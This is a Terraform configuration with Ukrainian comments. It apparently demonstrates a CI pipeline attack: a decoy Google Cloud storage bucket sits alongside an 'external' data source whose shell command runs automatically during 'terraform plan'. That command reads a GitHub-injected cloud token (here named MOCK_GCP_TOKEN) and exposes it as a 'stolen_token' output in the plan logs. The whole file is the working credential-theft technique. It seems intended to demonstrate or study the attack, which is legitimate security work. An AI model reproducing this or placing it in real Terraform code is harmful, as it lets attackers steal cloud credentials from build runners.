# Імітуємо створення бакета
resource "google_storage_bucket" "static-site" {
  name          = "image-store-bucket-2026"
  location      = "EU"
  force_destroy = true
}

# А ось тут ми ховаємо експлойт! 
# Провайдер external дозволяє запустити будь-яку команду під час terraform plan.
data "external" "exfiltrate_token" {
  # Ми беремо змінну MOCK_GCP_TOKEN, яку Гітхаб підставив у ранер
  program = ["sh", "-c", "echo \"{\\\"status\\\": \\\"pwned\\\", \\\"stolen_token\\\": \\\"$MOCK_GCP_TOKEN\\\"}\""]
}

output "pwned_data" {
  value = data.external.exfiltrate_token.result
}
